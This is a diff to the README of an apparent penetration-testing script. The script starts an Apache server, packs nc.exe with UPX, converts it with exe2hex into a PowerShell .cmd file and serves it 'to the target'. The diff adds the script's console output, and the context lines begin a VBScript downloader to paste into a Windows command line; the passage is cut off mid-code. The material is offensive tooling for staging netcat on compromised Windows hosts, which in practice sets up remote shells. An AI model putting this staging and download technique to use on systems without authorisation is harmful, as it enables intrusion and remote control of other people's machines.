@@ -6,6 +6,32 @@ This script starts an apache2 webserver, clones nc.exe, converts the clone to he
 ## Usage
 This script was written to help send a Windows compatible netcat and make it accessible to be downloaded via the webserver. 
 
+`./necat2hex4ft.sh`
+
+```######################################################################
+   This script starts an Apache2 server, clones nc.exe, converts it
+             into hex and adds to /var/www/html file
+######################################################################
+Do you want to continue? y/n: y
+                      Apache2 Server Started...
+######################################################################
+                       Ultimate Packer for eXecutables
+                          Copyright (C) 1996 - 2020
+UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020
+
+        File size         Ratio      Format      Name
+   --------------------   ------   -----------   -----------
+     59392 ->     29696   50.00%    win32/pe     nc.exe                        
+
+Packed 1 file.
+[*] exe2hex v1.5.1
+[+] Successfully wrote (PoSh) /home/parallels/Tools/nc.cmd
+nc.cmd
+######################################################################
+Success! /var/www/html/nc.cmd is ready to be transfered to the target! 
+######################################################################```
+
+
 You may need to create a HTTP Downloader which can be done by copying and pasting the following code and pasting it to the Windows CLI:
 ```echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
